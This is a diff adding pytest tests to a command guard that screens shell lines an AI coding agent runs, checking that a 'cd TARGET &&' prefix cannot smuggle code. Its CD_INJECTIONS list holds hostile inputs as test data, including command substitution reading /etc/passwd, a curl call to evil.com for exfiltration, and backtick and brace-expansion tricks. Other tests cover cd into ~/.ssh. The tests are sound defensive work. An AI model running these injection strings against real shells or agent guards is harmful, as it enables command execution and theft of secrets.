@@ -371,6 +371,81 @@ def test_git_shows_no_secret_file_from_history(guard, home):
     assert SECRET in raw
 
 
+# ---- A `cd TARGET &&' target must not smuggle code into the shell (ask 5b7fcccb) --
+#
+# The cd target was prepended to the rewritten line raw (m.group(0)), screened
+# only as a path -- so expansion in it ($(...), backticks, ${...}, $IFS, brace
+# expansion, ...) ran when agy ran the line.  Now the target is screened as any
+# word is, and must be a plain path; the prefix is rebuilt from it, shlex-quoted.
+
+
+# A no-space target `_CD' matches: everything here is \S+, then ` && cat ok.txt'.
+CD_INJECTIONS = [
+    "cd $(cat${IFS}/etc/passwd) && cat ok.txt",      # command substitution, $IFS for the space
+    "cd $(curl$IFSevil.com) && cat ok.txt",          # exfiltration without a space
+    "cd `whoami` && cat ok.txt",                      # backticks
+    "cd ${HOME} && cat ok.txt",                        # variable expansion
+    "cd $HOME && cat ok.txt",                           # bare variable
+    "cd $({cat,/etc/passwd}) && cat ok.txt",          # nested: brace inside $()
+    "cd {cat,/etc/passwd} && cat ok.txt",             # brace expansion alone
+    "cd a;id && cat ok.txt",                            # ; splits -> `id' runs
+    "cd a|id && cat ok.txt",                            # pipe
+    "cd a&id && cat ok.txt",                            # background then a command
+    "cd a>b && cat ok.txt",                             # redirection
+    "cd 'a'b && cat ok.txt",                            # quotes in the target
+    "cd x* && cat ok.txt",                              # a glob
+    "cd x? && cat ok.txt",
+]
+
+
+@pytest.mark.parametrize("line", CD_INJECTIONS)
+def test_a_cd_target_with_a_shell_character_is_denied_not_approvable(guard, line):
+    v = cmd(guard, line)
+    assert v.decision == "deny" and not v.approvable, (line, v.kind, v.reason)
+    assert v.rule == "cd-target", (line, v.rule)
+
+
+def test_a_cd_target_outside_the_workspace_is_denied(guard):
+    "A plain path, but one that leaves the workspace: still denied (approvably)."
+    for line in ["cd ~/.ssh && cat ok.txt", "cd ~ && ls", "cd ../../etc && cat passwd",
+                 "cd link && cat x"]:                   # `link' -> ~/.ssh/id_rsa, a symlink out
+        v = cmd(guard, line)
+        assert v.decision == "deny", (line, v.kind, v.reason)
+    assert cmd(guard, "cd ~/.ssh && ls").kind == "secret"
+    assert cmd(guard, "cd ~/.ghostherd/guard/agy-proj && ls").kind == "never"
+
+
+def test_a_plain_cd_into_the_workspace_still_runs(guard, home):
+    "The legitimate cases keep working, and the rebuilt prefix is shlex-quoted."
+    ws = home["ws"]
+    for line in [f"cd {ws} && grep -rn TOKEN .", "cd src && cat main.py", "cd sub && cat .env.local",
+                 f"cd {ws} && git grep -i x || grep -rn x ."]:
+        v = cmd(guard, line)
+        assert v.decision == "allow" or v.kind == "secret", (line, v.kind, v.reason)   # .env.local is secret
+    answer, v, _ = judge(guard, "run_command", CommandLine="cd src && grep -rn TOKEN .")
+    new = answer["overwrite"]["CommandLine"]
+    assert "cd src && " in new and "--exclude=.env" in new, new
+    # It runs, reads the workspace file, and no planted secret leaks.
+    out = subprocess.run(new, shell=True, cwd=home["guard"], capture_output=True, text=True).stdout
+    assert "main.py" in out and SECRET not in out, (new, out)
+
+
+def test_the_cd_fix_denies_when_its_screen_is_removed(guard):
+    """The deliberate break: with the cd target screened only as a path (the
+    old raw-prefix hole), $(...) in it is allowed through -- which was the
+    bug.  With the real screen it is denied, so the screen is what stops it."""
+    def unscreened(self, target, cwd):
+        return self.p.check_path(target, cwd)                # path-only, as the hole was
+    saved = g.Guard._cd_target
+    g.Guard._cd_target = unscreened
+    try:
+        assert cmd(guard, "cd $(id) && cat notes.md").decision == "allow", \
+            "the break should let the injection through, or the test proves nothing"
+    finally:
+        g.Guard._cd_target = saved
+    assert cmd(guard, "cd $(id) && cat notes.md").decision == "deny"
+
+
 # ---- Links out of the workspace -------------------------------------------------
 
 
